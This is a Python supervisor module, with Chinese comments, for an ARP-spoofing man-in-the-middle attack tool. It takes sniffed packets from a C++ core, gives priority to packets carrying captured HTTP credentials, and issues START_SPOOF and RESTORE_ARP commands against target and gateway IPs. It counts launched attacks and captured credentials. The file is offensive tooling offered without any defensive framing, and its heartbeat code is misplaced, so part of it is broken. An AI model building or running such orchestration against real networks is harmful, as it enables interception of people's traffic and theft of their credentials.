#!/usr/bin/env python3
"""
ARP Spoofer Python Supervisor v2.0
===================================
职责：
1. 从C++核心接收网络数据包
2. 分析数据包并做出攻击决策
3. 管理目标状态（TTL缓存）
4. 向C++核心下发攻击指令
5. 提供Web API和监控接口
"""

import zmq
import json
import time
import threading
import logging
import argparse
import signal
import sys
import hashlib  # ★【新增】★ 用于计算数据包指纹
import queue     # ★【新增】★ 用于批量命令处理
import platform  # ★【新增】★ 用于平台检测
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import Optional, Dict, Set
from datetime import datetime, timedelta

from state_cache import StateCache
from packet_analyzer import PacketAnalyzer
from attack_coordinator import AttackCoordinator
from web_api import WebAPI
from config import Config

class PythonSupervisor:
    """Python监督者主类"""
    
    def __init__(self, config: Config):
        self.config = config
        self.running = False
        
        # ★【修复】★ 首先设置日志系统
        self._setup_logging()
        
        # ZMQ上下文和套接字
        self.context = zmq.Context()
        # ★【新增】★ 独立的心跳ZMQ上下文，避免GIL争用
        self.heartbeat_context = zmq.Context()
        self.packet_receiver = None
        self.command_sender = None
        self.heartbeat_receiver = None  # ★【新增】★ 心跳接收通道
        self.heartbeat_sender = None    # ★【新增】★ 心跳线程专用发送通道
        self.heartbeat_sender_dedicated = None  # ★【新增】★ 独立心跳上下文的发送通道
        
        # ★【ARM优化】★ 检测平台并调整参数
        self.is_arm_platform = platform.machine().startswith(('arm', 'aarch'))
        self.cache_ttl = 2  # TTL时间
        
        if self.is_arm_platform:
            # ARM平台保守配置
            max_threads = min(config.max_worker_threads, 4)  # 限制为4线程
            queue_size = 500    # 减小队列
            self.logger.info("🔧 ARM platform detected, using conservative settings")
        else:
            # x86平台正常配置
            max_threads = min(config.max_worker_threads, 8)
            queue_size = 1000
        
        # ★【新增】★ 批量命令处理
        self.command_queue = queue.Queue(maxsize=queue_size)
        self.command_processor_thread = None
        self.command_processor_running = False
        
        # 核心组件
        self.state_cache = StateCache()
        self.packet_analyzer = PacketAnalyzer(config)
        self.attack_coordinator = AttackCoordinator(config, self.state_cache)
        self.web_api = WebAPI(self.state_cache, config)
        
        # ★【新增】★ 心跳机制
        self.last_ping_time = time.time()
        self.heartbeat_thread = None
        self.heartbeat_running = False
        
        self.thread_pool = ThreadPoolExecutor(
            max_workers=max_threads,
            thread_name_prefix="PacketWorker"
        )
        
        # ★【增强】★ 统计信息，添加更多监控指标
        self.stats = {
            'start_time': time.time(),
            'packets_received': 0,
            'packets_processed': 0,
            'packets_dropped': 0,        # ★【新增】★ 丢包统计
            'commands_sent': 0,
            'commands_queued': 0,        # ★【新增】★ 队列命令数
            'attacks_launched': 0,
            'credentials_captured': 0,
            'heartbeat_sent': 0,         # ★【新增】★ 心跳发送统计
            'heartbeat_received': 0,     # ★【新增】★ 心跳接收统计
            'processing_rate': 0.0       # ★【新增】★ 处理速率
        }
        self.stats_lock = threading.RLock()  # ★【优化】★ 使用可重入锁
        
        # ★★★【优化】★★★ 入口去重缓存，减少内存占用
        # 简化缓存实现，避免外部依赖
        self.recent_packets_cache = {}
        self.cache_lock = threading.Lock()  # 用于保护缓存的线程安全
        
        # ★【优化】★ HTTP凭据级别的去重缓存，减少大小
        self.http_credentials_cache = {}
        self.http_cache_lock = threading.Lock()
        self.http_cache_ttl = 8  # 8秒TTL
        
    def _setup_logging(self):
        """设置日志系统"""
        logging.basicConfig(
            level=getattr(logging, self.config.log_level.upper()),
            format='[%(asctime)s] [%(threadName)-20s] [%(levelname)-8s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            handlers=[
                logging.FileHandler(self.config.log_file, mode='a'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger(__name__)
        
    def initialize(self) -> bool:
        """初始化监督者"""
        try:
            self.logger.info("Initializing Python Supervisor...")
            
            # 初始化ZMQ套接字
            if not self._init_zmq():
                return False
                
            # 初始化各个组件
            # ★【修改】★ 使用队列命令而不是直接发送
            if not self.attack_coordinator.initialize(self._queue_command):
                self.logger.error("Failed to initialize attack coordinator")
                return False
            
            # ★【新增】★ 启动命令处理线程
            self._start_command_processor()
                
            # 启动Web API（如果启用）
            if self.config.enable_web_api:
                self.web_api.start(self.config.web_api_port)
                
            self.logger.info("Python Supervisor initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize supervisor: {e}")
            return False
            
    def _init_zmq(self) -> bool:
        """初始化ZMQ通信"""
        try:
            # 1. Packet Receiver (C++ PUSH -> Python PULL)
            self.packet_receiver = self.context.socket(zmq.PULL)
            self.packet_receiver.bind(self.config.ipc.packet_address)
            self.packet_receiver.setsockopt(zmq.RCVTIMEO, 500)
            self.packet_receiver.setsockopt(zmq.RCVHWM, self.config.ipc.packet_hwm)

            # 2. Command Sender (Python PUSH -> C++ PULL)
            self.command_sender = self.context.socket(zmq.PUSH)
            self.command_sender.connect(self.config.ipc.command_address)
            self.command_sender.setsockopt(zmq.SNDTIMEO, 500)
            self.command_sender.setsockopt(zmq.SNDHWM, self.config.ipc.command_hwm)
            self.command_sender.setsockopt(zmq.LINGER, 0)

            # 3. Heartbeat PING Receiver (C++ PUSH -> Python PULL)
            self.heartbeat_receiver = self.heartbeat_context.socket(zmq.PULL)
            self.heartbeat_receiver.bind(self.config.ipc.heartbeat_ping_address)
            self.heartbeat_receiver.setsockopt(zmq.RCVTIMEO, self.config.ipc.heartbeat_timeout)
            self.heartbeat_receiver.setsockopt(zmq.RCVHWM, self.config.ipc.heartbeat_hwm)
            self.heartbeat_receiver.setsockopt(zmq.LINGER, 0)

            # 4. Heartbeat PONG Sender (Python PUSH -> C++ PULL)
            self.heartbeat_sender = self.heartbeat_context.socket(zmq.PUSH)
            self.heartbeat_sender.connect(self.config.ipc.heartbeat_pong_address)
            self.heartbeat_sender.setsockopt(zmq.SNDTIMEO, 200)
            self.heartbeat_sender.setsockopt(zmq.SNDHWM, self.config.ipc.heartbeat_hwm)
            self.heartbeat_sender.setsockopt(zmq.LINGER, 0)

            self.logger.info("ZMQ sockets initialized with correct roles:")
            self.logger.info(f"  - Packet Receiver [PULL-BIND]   @ {self.config.ipc.packet_address}")
            self.logger.info(f"  - Command Sender  [PUSH-CONNECT] @ {self.config.ipc.command_address}")
            self.logger.info(f"  - Heartbeat PING  [PULL-BIND]   @ {self.config.ipc.heartbeat_ping_address}")
            self.logger.info(f"  - Heartbeat PONG  [PUSH-CONNECT] @ {self.config.ipc.heartbeat_pong_address}")
            self.logger.info("🫀 All IPC channels are correctly configured.")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize ZMQ: {e}")
            return False

    def run(self):
        """运行主循环"""
        self.running = True
        self.logger.info("Starting main supervisor loop...")
        
        # ★【新增】★ 启动心跳机制
        self.start_heartbeat()
        
        # ★【新增】★ 启动性能监控
        self._start_performance_monitoring()
        
        try:
            while self.running:
                try:
                    # 1. 接收原始二进制数据
                    raw_data = self.packet_receiver.recv(zmq.NOBLOCK)
                    with self.stats_lock:
                        self.stats['packets_received'] += 1
                    
                    # ★★★【关键性能优化】★★★ 主线程只负责快速接收和分发
                    # 2. 最轻量的预检查 - 只检查数据长度
                    if len(raw_data) < 10:  # 过小的数据直接丢弃
                        with self.stats_lock:
                            self.stats['packets_dropped'] += 1
                        continue
                    
                    # ★【负载控制】★ 检查队列深度，防止过载
                    if self.command_queue.qsize() > 800:  # 过载阈值
                        with self.stats_lock:
                            self.stats['packets_dropped'] += 1
                        self.logger.warning("System overloaded, dropping packet")
                        continue
                    
                    # 3. ★【性能关键】★ 直接提交到线程池，避免主线程阻塞
                    # 将所有重型操作（JSON解析、哈希计算、去重）都移到工作线程中
                    self.thread_pool.submit(self._process_packet_with_dedup, raw_data)
                    
                except zmq.Again:
                    # 没有数据包，短暂休眠
                    time.sleep(0.001)
                    continue
                    
                except Exception as e:
                    self.logger.error(f"Error in main loop: {e}")
                    time.sleep(0.1)
                    
        except KeyboardInterrupt:
            self.logger.info("Received interrupt signal")
        finally:
            self.shutdown()
            
    def _process_packet_with_dedup(self, raw_data: bytes):
        """处理数据包并进行去重 - 在工作线程中执行的优化版本"""
        try:
            # 1. 将原始二进制数据转换为字符串
            packet_data = raw_data.decode('utf-8')
            
            # 2. ★【关键优化】★ 快速哈希去重，避免重复处理
            packet_hash = hashlib.md5(packet_data.encode()).hexdigest()
            
            with self.cache_lock:
                current_time = time.time()
                
                # 清理过期缓存
                expired_keys = [k for k, (_, timestamp) in self.recent_packets_cache.items() 
                              if current_time - timestamp > self.cache_ttl]
                for key in expired_keys:
                    del self.recent_packets_cache[key]
                
                if packet_hash in self.recent_packets_cache:
                    with self.stats_lock:
                        self.stats['packets_dropped'] += 1
                    return  # 重复数据包，直接丢弃
                
                # 添加到去重缓存
                self.recent_packets_cache[packet_hash] = (True, current_time)
            
            # 3. 执行实际的数据包处理
            self._process_packet(packet_data)
            
        except UnicodeDecodeError:
            # 二进制数据解码失败
            with self.stats_lock:
                self.stats['packets_dropped'] += 1
            self.logger.debug("Failed to decode packet data")
        except Exception as e:
            with self.stats_lock:
                self.stats['packets_dropped'] += 1
            self.logger.error(f"Error in packet processing with dedup: {e}")
    
    def _process_packet(self, packet_data: str):
        """处理单个数据包"""
        try:
            # 解析数据包
            packet_info = json.loads(packet_data)
            with self.stats_lock:
                self.stats['packets_processed'] += 1
            
            # 分析数据包
            analysis_result = self.packet_analyzer.analyze(packet_info)
            
            if analysis_result:
                # ★★★【关键修复】★★★ 优先处理高价值事件，确保原子性
                if hasattr(analysis_result, 'http_credentials') and analysis_result.http_credentials:
                    # 高价值事件使用专门的原子处理方法
                    self.attack_coordinator.process_high_value_event_atomic(analysis_result)
                else:
                    # 常规事件使用普通决策流程
                    decision = self.attack_coordinator.make_decision(analysis_result)
                    if decision:
                        self._execute_decision(decision)
                    
        except json.JSONDecodeError:
            with self.stats_lock:
                self.stats['packets_dropped'] += 1
            self.logger.debug(f"Failed to decode JSON: {packet_data[:100]}")
        except Exception as e:
            with self.stats_lock:
                self.stats['packets_dropped'] += 1
            self.logger.error(f"Error processing packet: {e}")
            
    # ★【新增】★ 批量命令处理方法
    def _queue_command(self, command: dict):
        """将命令加入队列进行批量处理"""
        try:
            # 负载控制：如果队列太满，丢弃新命令
            if self.command_queue.full():
                with self.stats_lock:
                    self.stats['packets_dropped'] += 1
                self.logger.warning("Command queue full, dropping command")
                return
            
            self.command_queue.put(command, block=False)
            with self.stats_lock:
                self.stats['commands_queued'] += 1
                
        except queue.Full:
            with self.stats_lock:
                self.stats['packets_dropped'] += 1
            self.logger.warning("Command queue full, command dropped")
            
    def _start_command_processor(self):
        """启动批量命令处理线程"""
        self.command_processor_running = True
        self.command_processor_thread = threading.Thread(
            target=self._command_processor_loop, 
            daemon=True,
            name="CommandProcessor"
        )
        self.command_processor_thread.start()
        self.logger.info("Command processor thread started")
        
    def _command_processor_loop(self):
        """批量命令处理循环"""
        self.logger.info("Command processor loop started")
        batch_size = 5  # 批处理大小
        batch_timeout = 0.1  # 100ms批处理超时
        
        while self.command_processor_running:
            commands_batch = []
            
            try:
                # 收集一批命令
                start_time = time.time()
                while (len(commands_batch) < batch_size and 
                       time.time() - start_time < batch_timeout):
                    try:
                        command = self.command_queue.get(timeout=0.01)
                        commands_batch.append(command)
                    except queue.Empty:
                        continue
                
                # 批量发送命令
                if commands_batch:
                    self._send_commands_batch(commands_batch)
                    
            except Exception as e:
                self.logger.error(f"Error in command processor: {e}")
                time.sleep(0.1)  # 发生错误时短暂休眠
                
        self.logger.info("Command processor loop stopped")
        
    def _send_commands_batch(self, commands: list):
        """批量发送命令"""
        try:
            for command in commands:
                command_json = json.dumps(command)
                self.command_sender.send_string(command_json, zmq.NOBLOCK)
                
                with self.stats_lock:
                    self.stats['commands_sent'] += 1
                    
        except zmq.Again:
            self.logger.warning(f"Batch command send timeout, {len(commands)} commands failed")
            with self.stats_lock:
                self.stats['packets_dropped'] += len(commands)
        except Exception as e:
            self.logger.error(f"Error sending command batch: {e}")
            with self.stats_lock:
                self.stats['packets_dropped'] += len(commands)
    
    # ★【优化】★ 独立心跳处理方法
    def _handle_ping(self, ping_data):
        """处理心跳PING，使用独立通道发送PONG"""
        try:
            # ★【关键修复】★ 使用C++端期望的命令类型PONG而不是pong
            pong_response = {
                "type": "PONG",
                "timestamp": time.time(),
                "supervisor_id": "python_supervisor"
            }
            
            # ★【关键修复】★ 使用独立心跳发送通道，避免主通道阻塞
            pong_json = json.dumps(pong_response)
            self.heartbeat_sender_dedicated.send_string(pong_json, zmq.NOBLOCK)
            
            with self.stats_lock:
                self.stats['heartbeat_sent'] += 1
                
            # ★【优化】★ 降低心跳日志频率，避免日志洪泛
            current_time = time.time()
            if not hasattr(self, '_last_heartbeat_log') or current_time - self._last_heartbeat_log > 30:
                self.logger.debug("🫀 PONG sent via dedicated channel")
                self._last_heartbeat_log = current_time
                
        except zmq.Again:
            self.logger.warning("Heartbeat PONG send timeout via dedicated channel")
        except Exception as e:
            self.logger.error(f"Error sending heartbeat PONG: {e}")
    
    # ★【增强】★ 性能监控方法
    def _start_performance_monitoring(self):
        """启动性能监控"""
        self.performance_monitoring_thread = threading.Thread(
            target=self._performance_monitoring_loop,
            daemon=True,
            name="PerformanceMonitor"
        )
        self.performance_monitoring_thread.start()
        self.logger.info("Performance monitoring started")
        
    def _performance_monitoring_loop(self):
        """性能监控循环"""
        last_stats_time = time.time()
        last_packets = 0
        last_commands = 0
        
        while self.running:
            try:
                current_time = time.time()
                
                # 每30秒输出一次性能报告
                if current_time - last_stats_time >= 30:
                    with self.stats_lock:
                        current_packets = self.stats['packets_processed']
                        current_commands = self.stats['commands_sent']
                        
                        # 计算处理速率
                        time_diff = current_time - last_stats_time
                        packet_rate = (current_packets - last_packets) / time_diff
                        command_rate = (current_commands - last_commands) / time_diff
                        
                        self.stats['processing_rate'] = packet_rate
                        
                        # 输出性能报告
                        uptime = current_time - self.stats['start_time']
                        self.logger.info(f"📊 Performance Report:")
                        self.logger.info(f"  Uptime: {uptime:.1f}s")
                        self.logger.info(f"  Packets: {current_packets} (rate: {packet_rate:.1f}/s)")
                        self.logger.info(f"  Commands: {current_commands} (rate: {command_rate:.1f}/s)")
                        self.logger.info(f"  Queue size: {self.command_queue.qsize()}")
                        self.logger.info(f"  Drops: {self.stats['packets_dropped']}")
                        self.logger.info(f"  Heartbeat: sent={self.stats['heartbeat_sent']}, received={self.stats['heartbeat_received']}")
                        
                        # ★【新增】★ Scout发射器状态
                        if hasattr(self.attack_coordinator, 'scout_launcher'):
                            launcher = self.attack_coordinator.scout_launcher
                            with launcher.lock:
                                active_count = len(launcher.active_scouts)
                                queue_count = len(launcher.launch_queue)
                            self.logger.info(f"  🚀 Scouts: Active {active_count}/{launcher.max_concurrent}, Queued {queue_count}")
                        
                        # ★【增强】★ 显示Scout和Attack会话统计
                        if hasattr(self.attack_coordinator, 'get_session_stats'):
                            session_stats = self.attack_coordinator.get_session_stats()
                            self.logger.info(f"  Sessions: Scout {session_stats['active_scouts']}/{session_stats['max_scout_attacks']}, Attack {session_stats['active_attacks']}/{session_stats['max_active_attacks']}")
                        
                        # ★【增强】★ 并发控制状态
                        if hasattr(self.attack_coordinator, 'get_concurrency_stats'):
                            concurrency_stats = self.attack_coordinator.get_concurrency_stats()
                            self.logger.info(f"  🎫 Tokens: {concurrency_stats['tokens_available']}/{concurrency_stats['max_tokens']}, Delayed: {concurrency_stats['delayed_attacks']}")
                        
                        # ★【新增】★ 显示并发状态监控
                        if hasattr(self.attack_coordinator, 'get_concurrency_stats'):
                            concurrency_stats = self.attack_coordinator.get_concurrency_stats()
                            self.logger.info(f"  Concurrency: Processing {concurrency_stats.get('processing_credentials', 0)} credentials, Restoring {concurrency_stats.get('restoring_targets', 0)} targets")
                        
                        # 更新统计
                        last_packets = current_packets
                        last_commands = current_commands
                        last_stats_time = current_time
                        
                        # ★【优化】★ 调整警告阈值，适应不同平台
                        queue_threshold = 300 if self.is_arm_platform else 500
                        packet_threshold = 150 if self.is_arm_platform else 300
                        
                        if self.command_queue.qsize() > queue_threshold:
                            self.logger.warning("⚠️  High command queue depth detected!")
                        if packet_rate > packet_threshold:
                            self.logger.warning("⚠️  High packet processing rate!")
                        
                        # ★【新增】★ Scout启动速率监控
                        if hasattr(self.attack_coordinator, 'scout_launcher'):
                            launcher = self.attack_coordinator.scout_launcher
                            with launcher.lock:
                                active_count = len(launcher.active_scouts)
                            if active_count > launcher.max_concurrent * 0.8:  # 80%使用率警告
                                self.logger.warning(f"⚠️  High Scout utilization: {active_count}/{launcher.max_concurrent}")
                        
                        # ★【新增】★ 延迟队列监控
                        if hasattr(self.attack_coordinator, 'delayed_attacks'):
                            delayed_count = len(self.attack_coordinator.delayed_attacks)
                            if delayed_count > 20:
                                self.logger.warning(f"⚠️  High delayed attack queue: {delayed_count}")
                
                time.sleep(5)  # 每5秒检查一次
                
            except Exception as e:
                self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(5)
    
    # ★【新增】★ 优化的执行决策方法
    def _execute_decision(self, decision):
        """执行攻击决策 - 使用队列而不是直接发送"""
        try:
            # ★【关键修复】★ AttackDecision是dataclass对象，使用属性访问而不是字典下标
            # ★【关键修复】★ 修正命令类型，匹配C++端期望的格式
            if decision.action == "attack":
                command_type = "START_SPOOF"
            elif decision.action == "restore": 
                command_type = "RESTORE_ARP"
            elif decision.action == "ignore":
                # ignore类型不需要发送命令给C++端
                return
            else:
                self.logger.warning(f"Unknown decision action: {decision.action}")
                return
                
            command = {
                "type": command_type,
                "target_ip": decision.target_ip,
                "gateway_ip": decision.gateway_ip or "10.17.0.1",
                "target_mac": decision.target_mac or "",
                "gateway_mac": decision.gateway_mac or "",
                "duration": decision.duration or 60,
                "attack_type": decision.attack_type or "scouting"
            }
            
            # ★【关键修改】★ 使用队列而不是直接发送
            self._queue_command(command)
            
            with self.stats_lock:
                self.stats['attacks_launched'] += 1
                
        except Exception as e:
            self.logger.error(f"Error executing decision: {e}")
    
    # ★【新增】★ 程序结束时打印最终统计
    def _print_final_stats(self):
        """打印最终统计信息"""
        uptime = time.time() - self.stats['start_time']
        
        print("\n" + "="*50)
        print("📋 Final Statistics Summary")
        print("="*50)
        print(f"Total uptime: {uptime:.1f} seconds")
        print(f"Packets received: {self.stats['packets_received']}")
        print(f"Packets processed: {self.stats['packets_processed']}")
        print(f"Packets dropped: {self.stats['packets_dropped']}")
        print(f"Commands sent: {self.stats['commands_sent']}")
        print(f"Commands queued: {self.stats['commands_queued']}")
        print(f"Attacks launched: {self.stats['attacks_launched']}")
        print(f"Credentials captured: {self.stats['credentials_captured']}")
        print(f"Heartbeats sent: {self.stats['heartbeat_sent']}")
        print(f"Heartbeats received: {self.stats['heartbeat_received']}")
        
        if uptime > 0:
            print(f"Average packet rate: {self.stats['packets_processed']/uptime:.1f} packets/sec")
            print(f"Average command rate: {self.stats['commands_sent']/uptime:.1f} commands/sec")
        
        # 计算效率指标
        total_packets = self.stats['packets_processed'] + self.stats['packets_dropped']
        if total_packets > 0:
            drop_rate = (self.stats['packets_dropped'] / total_packets) * 100
            print(f"Packet drop rate: {drop_rate:.2f}%")
        
        if self.stats['heartbeat_sent'] > 0:
            heartbeat_success_rate = (self.stats['heartbeat_received'] / self.stats['heartbeat_sent']) * 100
            print(f"Heartbeat success rate: {heartbeat_success_rate:.2f}%")
        
        print("="*50)
    
    # ★【修改】★ 优化的关闭处理
    def shutdown(self):
        """优雅关闭监督者"""
        self.logger.info("🛑 Starting supervisor shutdown sequence...")
        
        # 发送关闭信号给C++核心
        try:
            # ★【关键修复】★ 使用C++端期望的命令类型SHUTDOWN而不是shutdown
            shutdown_cmd = {"type": "SHUTDOWN"}
            # ★【关键修复】★ 使用正确的方法名_queue_command而不是不存在的_send_command
            self._queue_command(shutdown_cmd)
            self.logger.info("📤 Shutdown signal sent to C++ core")
        except Exception as e:
            self.logger.error(f"Failed to send shutdown command: {e}")
        
        self.running = False
        
        # ★【新增】★ 停止命令处理线程
        if hasattr(self, 'command_processor_running'):
            self.command_processor_running = False
            if hasattr(self, 'command_processor_thread') and self.command_processor_thread:
                self.command_processor_thread.join(timeout=2.0)
                self.logger.info("Command processor thread stopped")
        
        # 停止心跳
        self.stop_heartbeat()
        
        # 停止Web API
        if self.config.enable_web_api:
            self.web_api.stop()
        
        # 关闭线程池
        self.thread_pool.shutdown(wait=True)
        
        # ★【新增】★ 清理独立心跳上下文
        if hasattr(self, 'heartbeat_context'):
            self.heartbeat_context.term()
        
        # 关闭ZMQ上下文
        self.context.term()
        
        # ★【新增】★ 打印最终统计
        self._print_final_stats()
        
        self.logger.info("✅ Supervisor shutdown complete")

    def start_heartbeat(self):
        """启动心跳监听线程"""
        if self.heartbeat_running:
            return
            
        self.heartbeat_running = True
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True, name="HeartbeatLoop")
        self.heartbeat_thread.start()
        self.logger.info("🫀 Heartbeat loop started, waiting for PING from C++ core...")
    
    def stop_heartbeat(self):
        """停止心跳机制"""
        self.heartbeat_running = False
        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            self.heartbeat_thread.join(timeout=1.0)
        self.logger.info("Heartbeat mechanism stopped")
    
    def _heartbeat_loop(self):
        """心跳监听循环 - 高优先级，确保及时响应"""
        # ★【跨平台修复】★ 设置线程优先级
        self._set_thread_priority_high()
            
    def _set_thread_priority_high(self):
        """跨平台设置线程高优先级"""
        try:
            import os
            import platform
            import threading
            
            system = platform.system().lower()
            if system == "windows":
                # Windows平台
                import ctypes
                ctypes.windll.kernel32.SetThreadPriority(
                    ctypes.windll.kernel32.GetCurrentThread(), 2)  # THREAD_PRIORITY_ABOVE_NORMAL
                self.logger.debug("Windows thread priority set to high")
            elif system == "linux":
                # Linux平台 (包括ARM设备)
                try:
                    import ctypes
                    libc = ctypes.CDLL("libc.so.6")
                    # 设置nice值为-10 (较高优先级)
                    libc.setpriority(0, 0, -10)  # PRIO_PROCESS, 当前进程, nice值
                    self.logger.debug("Linux thread priority set to high (nice -10)")
                except Exception as e:
                    # 尝试通过os.nice设置进程优先级
                    try:
                        current_nice = os.nice(0)
                        if current_nice > -10:
                            os.nice(-10 - current_nice)
                        self.logger.debug(f"Linux process nice set from {current_nice} to {os.nice(0)}")
                    except Exception as e2:
                        self.logger.warning(f"Failed to set Linux priority: {e}, {e2}")
            elif system == "darwin":
                # macOS平台
                try:
                    import ctypes
                    libc = ctypes.CDLL("/usr/lib/libc.dylib")
                    libc.setpriority(0, 0, -10)  # 设置较高优先级
                    self.logger.debug("macOS thread priority set to high")
                except Exception as e:
                    self.logger.warning(f"Failed to set macOS priority: {e}")
            else:
                self.logger.warning(f"Unknown platform {system}, skipping priority setting")
                
        except Exception as e:
            self.logger.warning(f"Failed to set thread priority: {e}")
            # 继续执行，不因为优先级设置失败而中断
            
        heartbeat_failures = 0
        last_heartbeat_time = time.time()
        
        while self.heartbeat_running:
            try:
                # ★【紧急修复】★ 更短的polling间隔，避免心跳饥饿
                message = self.heartbeat_receiver.recv_string(zmq.NOBLOCK)
                ping_data = json.loads(message)
                
                # ★【关键修复】★ C++端发送的是大写的"PING"而不是小写的"ping"
                if ping_data.get("type") == "PING":
                    current_time = time.time()
                    
                    # ★【紧急修复】★ 原子化统计更新，避免锁竞争
                    try:
                        with self.stats_lock:
                            self.stats['heartbeat_received'] += 1
                    except:
                        pass  # 如果锁竞争激烈，跳过统计，优先处理心跳
                    
                    # ★【紧急修复】★ 直接响应，减少中间调用
                    self._handle_ping_immediate(ping_data, current_time)
                    
                    # 重置失败计数
                    heartbeat_failures = 0
                    last_heartbeat_time = current_time
                    
            except zmq.Again:
                # ★【紧急修复】★ 检查心跳超时
                current_time = time.time()
                if current_time - last_heartbeat_time > 10:  # 10秒无心跳
                    heartbeat_failures += 1
                    if heartbeat_failures <= 3:  # 只记录前3次
                        print(f"⚠️  HEARTBEAT WARNING: No PING for {current_time - last_heartbeat_time:.1f}s (failure #{heartbeat_failures})")
                    last_heartbeat_time = current_time
                
                # ★【紧急修复】★ 极短的睡眠时间，确保高响应性
                time.sleep(0.01)  # 10ms而不是100ms
                continue
                
            except Exception as e:
                # ★【紧急修复】★ 直接打印而不是使用logger，避免日志锁竞争
                print(f"❌ HEARTBEAT ERROR: {e}")
                time.sleep(0.05)
        
        self.logger.info("Heartbeat loop stopped")
        
    # ★【紧急修复】★ 立即心跳响应方法，避免锁竞争和复杂处理
    def _handle_ping_immediate(self, ping_data, current_time):
        """立即处理PING消息，最小化延迟"""
        try:
            # 构造简单的PONG响应
            pong_response = {
                "type": "PONG",
                "timestamp": current_time,
                "sequence": ping_data.get("sequence", 0),
                "supervisor_status": "running"
            }
            
            # ★【关键】★ 使用独立心跳sender，避免队列阻塞
            self.heartbeat_sender.send_string(json.dumps(pong_response), zmq.NOBLOCK)
            
            # ★【紧急修复】★ 原子化统计更新，如果锁竞争就跳过
            try:
                with self.stats_lock:
                    self.stats['heartbeat_sent'] += 1
            except:
                pass  # 锁竞争时跳过统计，优先响应心跳
                
        except Exception as e:
            # ★【紧急修复】★ 直接打印，避免logger锁竞争
            print(f"❌ IMMEDIATE PONG ERROR: {e}")

def parse_arguments():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(description="ARP Spoofer Python Supervisor")
    parser.add_argument('-c', '--config', default='config.yaml',
                       help='Configuration file path')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       default='INFO', help='Log level')
    parser.add_argument('--web-api', action='store_true',
                       help='Enable web API interface')
    parser.add_argument('--web-port', type=int, default=8080,
                       help='Web API port')
    
    return parser.parse_args()

def signal_handler(signum, frame):
    """信号处理器"""
    print(f"\nReceived signal {signum}, shutting down...")
    sys.exit(0)

def main():
    """主函数"""
    # 解析命令行参数
    args = parse_arguments()
    
    # 设置信号处理
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        # 加载配置
        config = Config.load_from_file(args.config)
        
        # 命令行参数覆盖配置文件
        if args.log_level:
            config.log_level = args.log_level
        if args.web_api:
            config.enable_web_api = True
        if args.web_port:
            config.web_api_port = args.web_port
            
        # 创建并运行监督者
        supervisor = PythonSupervisor(config)
        
        if supervisor.initialize():
            supervisor.run()
        else:
            print("Failed to initialize supervisor")
            sys.exit(1)
            
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
